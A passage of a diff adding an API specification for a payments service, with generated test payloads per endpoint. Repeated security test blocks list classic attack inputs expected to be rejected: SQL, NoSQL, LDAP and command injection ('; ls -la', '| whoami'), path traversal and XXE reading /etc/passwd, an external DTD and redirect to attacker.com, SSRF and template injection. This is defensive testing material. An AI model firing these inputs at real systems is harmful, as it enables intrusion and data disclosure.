+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_4",
+              "category": "command_injection",
+              "description": "Command separator - list files",
+              "payload": {
+                "filename": "; ls -la"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_5",
+              "category": "command_injection",
+              "description": "Pipe operator - get current user",
+              "payload": {
+                "filename": "| whoami"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_6",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Unix",
+              "payload": {
+                "file": "../../../etc/passwd"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_7",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Windows",
+              "payload": {
+                "file": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_8",
+              "category": "xxe",
+              "description": "Basic XXE - file disclosure",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_9",
+              "category": "xxe",
+              "description": "XXE - external DTD",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_10",
+              "category": "nosql_injection",
+              "description": "MongoDB - not equal (authentication bypass)",
+              "payload": {
+                "$ne": null
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_11",
+              "category": "nosql_injection",
+              "description": "MongoDB - greater than (bypass)",
+              "payload": {
+                "$gt": ""
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_12",
+              "category": "ldap_injection",
+              "description": "LDAP wildcard - match all",
+              "payload": {
+                "username": "*"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_13",
+              "category": "ldap_injection",
+              "description": "LDAP filter bypass",
+              "payload": {
+                "username": "admin)(&)"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_14",
+              "category": "header_injection",
+              "description": "CRLF injection - cookie manipulation",
+              "payload": {
+                "redirect_url": "test\r\nSet-Cookie: admin=true"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_15",
+              "category": "header_injection",
+              "description": "CRLF injection - redirect",
+              "payload": {
+                "redirect_url": "test\r\nLocation: http://attacker.com"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_16",
+              "category": "ssrf",
+              "description": "SSRF - localhost access",
+              "payload": {
+                "url": "http://localhost/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_17",
+              "category": "ssrf",
+              "description": "SSRF - loopback access",
+              "payload": {
+                "url": "http://127.0.0.1/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_18",
+              "category": "template_injection",
+              "description": "Jinja2 - basic math test",
+              "payload": {
+                "template": "{{7*7}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_19",
+              "category": "template_injection",
+              "description": "Jinja2 - config disclosure",
+              "payload": {
+                "template": "{{config.items()}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            }
+          ],
+          "logic_fuzz": []
+        }
+      }
+    },
+    "/internal/admin/transactions": {
+      "get": {
+        "summary": "List transactions",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "List transactions for admin users."
+      }
+    },
+    "/api/v1/billing/invoices": {
+      "get": {
+        "summary": "List invoices",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "description": "List invoices for authenticated user."
+      },
+      "any": {
+        "summary": "List invoices",
+        "responses": {
+          "200": {
+            "description": "List of invoices"
+          },
+          "403": {
+            "description": "Access denied"
+          }
+        },
+        "parameters": [
+          {
+            "name": "customer_id",
+            "in": "query",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "limit",
+            "in": "query",
+            "required": false,
+            "schema": {
+              "type": "integer",
+              "minimum": 1,
+              "maximum": 200
+            }
+          }
+        ],
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "List customer invoices. IDOR protection: customer_id must match authenticated user."
+      }
+    },
+    "/api/v1/payment-methods": {
+      "get": {
+        "summary": "List payment methods",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "description": "List available payment methods."
+      }
+    },
+    "/api/v1/payments/{transaction_id}/capture": {
+      "post": {
+        "summary": "Capture authorized payment",
+        "responses": {
+          "403": {
+            "description": "Access denied"
+          },
+          "409": {
+            "description": "Payment not authorized"
+          }
+        },
+        "parameters": [
+          {
+            "name": "transaction_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "get_current_user": []
+          }
+        ],
+        "description": "Capture an authorized payment. Only transaction owner can capture.",
+        "x-test-payloads": {
+          "valid": [
+            {
+              "name": "valid_capture_payment",
+              "description": "Capture an authorized payment",
+              "payload": {},
+              "expected_status": 200
+            },
+            {
+              "name": "valid_capture_payment_with_id",
+              "description": "Capture an authorized payment with transaction ID",
+              "payload": {
+                "transaction_id": "tx_123456789"
+              },
+              "expected_status": 200
+            },
+            {
+              "name": "valid_capture_payment_with_user",
+              "description": "Capture an authorized payment with authenticated user",
+              "payload": {
+                "transaction_id": "tx_987654321"
+              },
+              "expected_status": 200
+            }
+          ],
+          "edge_cases": [
+            {
+              "name": "capture_unauthorized_payment",
+              "description": "Attempt to capture an unauthorized payment",
+              "payload": {
+                "transaction_id": "tx_unauthorized"
+              },
+              "expected_status": 409
+            },
+            {
+              "name": "capture_payment_for_other_user",
+              "description": "Attempt to capture a payment for another user",
+              "payload": {
+                "transaction_id": "tx_not_owned"
+              },
+              "expected_status": 403
+            },
+            {
+              "name": "capture_payment_with_long_id",
+              "description": "Capture payment with very long transaction ID",
+              "payload": {
+                "transaction_id": "tx_123456789012345678901234567890123456789012345"
+              },
+              "expected_status": [
+                200,
+                404
+              ]
+            },
+            {
+              "name": "capture_payment_with_empty_id",
+              "description": "Capture payment with empty transaction ID",
+              "payload": {
+                "transaction_id": ""
+              },
+              "expected_status": [
+                400,
+                404
+              ]
+            },
+            {
+              "name": "capture_payment_with_special_chars",
+              "description": "Capture payment with special characters in ID",
+              "payload": {
+                "transaction_id": "tx_!@#$%^&*()"
+              },
+              "expected_status": [
+                200,
+                404
+              ]
+            }
+          ],
+          "fuzz": [
+            {
+              "name": "capture_payment_with_invalid_type",
+              "description": "Capture payment with invalid type for transaction ID",
+              "payload": {
+                "transaction_id": 123456789
+              },
+              "expected_status": [
+                400,
+                422
+              ]
+            },
+            {
+              "name": "capture_payment_with_extra_fields",
+              "description": "Capture payment with extra unexpected fields",
+              "payload": {
+                "transaction_id": "tx_123456789",
+                "amount": 99.99,
+                "currency": "USD"
+              },
+              "expected_status": [
+                200,
+                400
+              ]
+            },
+            {
+              "name": "capture_payment_with_array_payload",
+              "description": "Capture payment with array as payload",
+              "payload": [
+                "tx_123456789",
+                "tx_987654321"
+              ],
+              "expected_status": [
+                400,
+                422
+              ]
+            },
+            {
+              "name": "capture_payment_with_object_payload",
+              "description": "Capture payment with object as payload",
+              "payload": {
+                "transaction": {
+                  "id": "tx_123456789"
+                }
+              },
+              "expected_status": [
+                400,
+                422
+              ]
+            }
+          ],
+          "summary": "Generated payloads for valid/edge/fuzz testing (security payloads added from templates)",
+          "security": [
+            {
+              "name": "sql_injection_0",
+              "category": "sql_injection",
+              "description": "Classic SQL injection - authentication bypass",
+              "payload": {
+                "username": "' OR '1'='1"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "sql_injection_1",
+              "category": "sql_injection",
+              "description": "Comment-based bypass",
+              "payload": {
+                "username": "admin' --"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_2",
+              "category": "xss",
+              "description": "Basic reflected XSS",
+              "payload": {
+                "name": "<script>alert('XSS')</script>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_3",
+              "category": "xss",
+              "description": "Event-based XSS",
+              "payload": {
+                "name": "<img src=x onerror=alert('XSS')>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_4",
+              "category": "command_injection",
+              "description": "Command separator - list files",
+              "payload": {
+                "filename": "; ls -la"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_5",
+              "category": "command_injection",
+              "description": "Pipe operator - get current user",
+              "payload": {
+                "filename": "| whoami"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_6",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Unix",
+              "payload": {
+                "file": "../../../etc/passwd"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_7",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Windows",
+              "payload": {
+                "file": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_8",
+              "category": "xxe",
+              "description": "Basic XXE - file disclosure",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_9",
+              "category": "xxe",
+              "description": "XXE - external DTD",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_10",
+              "category": "nosql_injection",
+              "description": "MongoDB - not equal (authentication bypass)",
+              "payload": {
+                "$ne": null
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_11",
+              "category": "nosql_injection",
+              "description": "MongoDB - greater than (bypass)",
+              "payload": {
+                "$gt": ""
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_12",
+              "category": "ldap_injection",
+              "description": "LDAP wildcard - match all",
+              "payload": {
+                "username": "*"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_13",
+              "category": "ldap_injection",
+              "description": "LDAP filter bypass",
+              "payload": {
+                "username": "admin)(&)"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_14",
+              "category": "header_injection",
+              "description": "CRLF injection - cookie manipulation",
+              "payload": {
+                "redirect_url": "test\r\nSet-Cookie: admin=true"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_15",
+              "category": "header_injection",
+              "description": "CRLF injection - redirect",
+              "payload": {
+                "redirect_url": "test\r\nLocation: http://attacker.com"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_16",
+              "category": "ssrf",
+              "description": "SSRF - localhost access",
+              "payload": {
+                "url": "http://localhost/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_17",
+              "category": "ssrf",
+              "description": "SSRF - loopback access",
+              "payload": {
+                "url": "http://127.0.0.1/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_18",
+              "category": "template_injection",
+              "description": "Jinja2 - basic math test",
+              "payload": {
+                "template": "{{7*7}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_19",
+              "category": "template_injection",
+              "description": "Jinja2 - config disclosure",
+              "payload": {
+                "template": "{{config.items()}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            }
+          ],
+          "logic_fuzz": []
+        }
+      },
+      "get": {
+        "summary": "Capture payment",
+        "responses": {
+          "200": {
+            "description": "Successful response"
+          }
+        },
+        "parameters": [
+          {
+            "name": "transaction_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "description": "Capture a payment transaction."
+      },
+      "any": {
+        "summary": "Capture payment",
+        "responses": {
+          "200": {
+            "description": "Payment captured"
+          },
+          "403": {
+            "description": "Access denied"
+          },
+          "409": {
+            "description": "Payment not authorized"
+          }
+        },
+        "parameters": [
+          {
+            "name": "transaction_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Capture an authorized payment."
+      }
+    },
+    "/api/v1/payments/{transaction_id}/void": {
+      "post": {
+        "summary": "Void pending/authorized payment",
+        "responses": {
+          "403": {
+            "description": "Access denied"
+          },
+          "409": {
+            "description": "Payment not pending or authorized"
+          }
+        },
+        "parameters": [
+          {
+            "name": "transaction_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "get_current_user": []
+          }
+        ],
+        "description": "Void pending or authorized payment. Only allowed for those states."
+      },
+      "get": {
+        "summary": "Void payment",
+        "responses": {
+          "200": {
+            "description": "Successful response"
+          }
+        },
+        "parameters": [
+          {
+            "name": "transaction_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "description": "Void a payment transaction."
+      },
+      "any": {
+        "summary": "Void payment",
+        "responses": {
+          "200": {
+            "description": "Payment voided"
+          },
+          "403": {
+            "description": "Access denied"
+          },
+          "409": {
+            "description": "Payment not pending/authorized"
+          }
+        },
+        "parameters": [
+          {
+            "name": "transaction_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Void a pending or authorized payment."
+      }
+    },
+    "/api/v1/currencies": {
+      "get": {
+        "summary": "List currencies",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "description": "List available payment currencies."
+      },
+      "any": {
+        "summary": "List currencies",
+        "responses": {
+          "200": {
+            "description": "List of currencies"
+          }
+        },
+        "description": "List supported currencies."
+      }
+    },
+    "/api/v1/payments": {
+      "get": {
+        "summary": "List payments",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        },
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "List payments for authenticated user."
+      },
+      "post": {
+        "summary": "Create payment",
+        "responses": {
+          "201": {
+            "description": "Payment created"
+          },
+          "400": {
+            "description": "Invalid request data"
+          },
+          "401": {
+            "description": "Unauthorized"
+          }
+        },
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": {
+                "type": "object",
+                "properties": {
+                  "amount": {
+                    "type": "number"
+                  },
+                  "currency": {
+                    "type": "string"
+                  },
+                  "payment_method_id": {
+                    "type": "string"
+                  }
+                },
+                "required": [
+                  "amount",
+                  "currency",
+                  "payment_method_id"
+                ]
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Initiates a new payment transaction.",
+        "x-test-payloads": {
+          "valid": [
+            {
+              "amount": 99.99,
+              "currency": "USD",
+              "payment_method": "credit_card",
+              "card_number": "4111111111111111",
+              "card_expiry": "2025-12",
+              "card_cvv": "123"
+            },
+            {
+              "amount": 49.5,
+              "currency": "EUR",
+              "payment_method": "debit_card",
+              "card_number": "5500000000000004",
+              "card_expiry": "2024-06",
+              "card_cvv": "456"
+            }
+          ],
+          "edge_cases": [
+            {
+              "amount": 0.01,
+              "currency": "USD",
+              "payment_method": "bank_transfer",
+              "account_number": "123456789012",
+              "routing_number": "021000021"
+            },
+            {
+              "amount": 9999999.99,
+              "currency": "JPY",
+              "payment_method": "wallet",
+              "wallet_id": "wallet_id_1234567890"
+            },
+            {
+              "amount": -1,
+              "currency": "XYZ",
+              "payment_method": "crypto",
+              "crypto_address": "0x0123456789abcdef"
+            }
+          ],
+          "fuzz": [
+            {
+              "amount": "invalid",
+              "currency": 123,
+              "payment_method": "",
+              "card_number": null
+            },
+            {
+              "extra_field": "should_error"
+            }
+          ],
+          "summary": "Generated payloads for payment processing",
+          "security": [
+            {
+              "name": "sql_injection_0",
+              "category": "sql_injection",
+              "description": "Classic SQL injection - authentication bypass",
+              "payload": {
+                "username": "' OR '1'='1"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "sql_injection_1",
+              "category": "sql_injection",
+              "description": "Comment-based bypass",
+              "payload": {
+                "username": "admin' --"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_2",
+              "category": "xss",
+              "description": "Basic reflected XSS",
+              "payload": {
+                "name": "<script>alert('XSS')</script>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_3",
+              "category": "xss",
+              "description": "Event-based XSS",
+              "payload": {
+                "name": "<img src=x onerror=alert('XSS')>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xss attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_4",
+              "category": "command_injection",
+              "description": "Command separator - list files",
+              "payload": {
+                "filename": "; ls -la"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "command_injection_5",
+              "category": "command_injection",
+              "description": "Pipe operator - get current user",
+              "payload": {
+                "filename": "| whoami"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject command injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_6",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Unix",
+              "payload": {
+                "file": "../../../etc/passwd"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "path_traversal_7",
+              "category": "path_traversal",
+              "description": "Basic path traversal - Windows",
+              "payload": {
+                "file": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject path traversal attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_8",
+              "category": "xxe",
+              "description": "Basic XXE - file disclosure",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xxe_9",
+              "category": "xxe",
+              "description": "XXE - external DTD",
+              "payload": {
+                "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]>\n<foo>&xxe;</foo>"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject xxe attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_10",
+              "category": "nosql_injection",
+              "description": "MongoDB - not equal (authentication bypass)",
+              "payload": {
+                "$ne": null
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "nosql_injection_11",
+              "category": "nosql_injection",
+              "description": "MongoDB - greater than (bypass)",
+              "payload": {
+                "$gt": ""
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject nosql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_12",
+              "category": "ldap_injection",
+              "description": "LDAP wildcard - match all",
+              "payload": {
+                "username": "*"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ldap_injection_13",
+              "category": "ldap_injection",
+              "description": "LDAP filter bypass",
+              "payload": {
+                "username": "admin)(&)"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ldap injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_14",
+              "category": "header_injection",
+              "description": "CRLF injection - cookie manipulation",
+              "payload": {
+                "redirect_url": "test\r\nSet-Cookie: admin=true"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "header_injection_15",
+              "category": "header_injection",
+              "description": "CRLF injection - redirect",
+              "payload": {
+                "redirect_url": "test\r\nLocation: http://attacker.com"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject header injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_16",
+              "category": "ssrf",
+              "description": "SSRF - localhost access",
+              "payload": {
+                "url": "http://localhost/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "ssrf_17",
+              "category": "ssrf",
+              "description": "SSRF - loopback access",
+              "payload": {
+                "url": "http://127.0.0.1/admin"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject ssrf attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_18",
+              "category": "template_injection",
+              "description": "Jinja2 - basic math test",
+              "payload": {
+                "template": "{{7*7}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "template_injection_19",
+              "category": "template_injection",
+              "description": "Jinja2 - config disclosure",
+              "payload": {
+                "template": "{{config.items()}}"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject template injection attack",
+              "source": "static_template"
+            }
+          ],
+          "logic_fuzz": []
+        }
+      },
+      "any": {
+        "summary": "Get payment",
+        "responses": {
+          "200": {
+            "description": "Payment details"
+          },
+          "403": {
+            "description": "Access denied"
+          }
+        },
+        "parameters": [
+          {
+            "name": "transaction_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Get payment details by transaction ID."
+      }
+    },
+    "/api/v1/payments/{transaction_id}": {
+      "get": {
+        "summary": "Get payment",
+        "responses": {
+          "200": {
+            "description": "Success"
+          },
+          "403": {
+            "description": "Access denied"
+          }
+        },
+        "parameters": [
+          {
+            "name": "transaction_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "security": [
+          {
+            "bearerAuth": []
+          }
+        ],
+        "description": "Get payment details by transaction ID."
+      },
+      "any": {
+        "summary": "Get payment",
+        "responses": {
+          "200": {
+            "description": "Payment details"
+          },
+          "404": {
+            "description": "Payment not found"
+          }
+        },
+        "parameters": [
+          {
+            "name": "transaction_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "description": "Get details of a payment transaction."
+      }
+    },
+    "/api/v1/refunds": {
+      "get": {
+        "summary": "Get refunds",
+        "responses": {
+          "200": {
+            "description": "Successful response"
+          }
+        },
+        "description": "Retrieve refund transactions."
+      },
+      "post": {
+        "summary": "Pay invoice",
+        "responses": {
+          "403": {
+            "description": "Access denied"
+          },
+          "409": {
+            "description": "Invoice not payable"
+          }
+        },
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "schema": {
+                "type": "object",
+                "properties": {
+                  "invoice_id": {
+                    "type": "string"
+                  }
+                },
+                "required": [
+                  "invoice_id"
+                ]
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "get_current_user": []
+          }
+        ],
+        "description": "Pay pending or overdue invoice. IDOR protection applied.",
+        "x-test-payloads": {
+          "valid": [
+            {
+              "transaction_id": "tx_123456789",
+              "customer_id": 1234
+            },
+            {
+              "transaction_id": "tx_987654321",
+              "customer_id": 5678
+            }
+          ],
+          "edge_cases": [
+            {
+              "transaction_id": "tx_000000000",
+              "customer_id": 0
+            },
+            {
+              "transaction_id": "tx_999999999",
+              "customer_id": 4294967295
+            },
+            {
+              "transaction_id": "tx_ABCDEFGHIJ",
+              "customer_id": -1
+            }
+          ],
+          "fuzz": [
+            {
+              "transaction_id": null,
+              "customer_id": "invalid"
+            },
+            {
+              "transaction_id": {},
+              "customer_id": []
+            }
+          ],
+          "security": [
+            {
+              "name": "sql_injection_0",
+              "category": "sql_injection",
+              "description": "Classic SQL injection - authentication bypass",
+              "payload": {
+                "username": "' OR '1'='1"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "sql_injection_1",
+              "category": "sql_injection",
+              "description": "Comment-based bypass",
+              "payload": {
+                "username": "admin' --"
+              },
+              "expected_status": [
+                400,
+                401,
+                403,
+                422
+              ],
+              "detection": "Should reject sql injection attack",
+              "source": "static_template"
+            },
+            {
+              "name": "xss_2",
+              "category": "xss",
+              "description": "Basic reflected XSS",
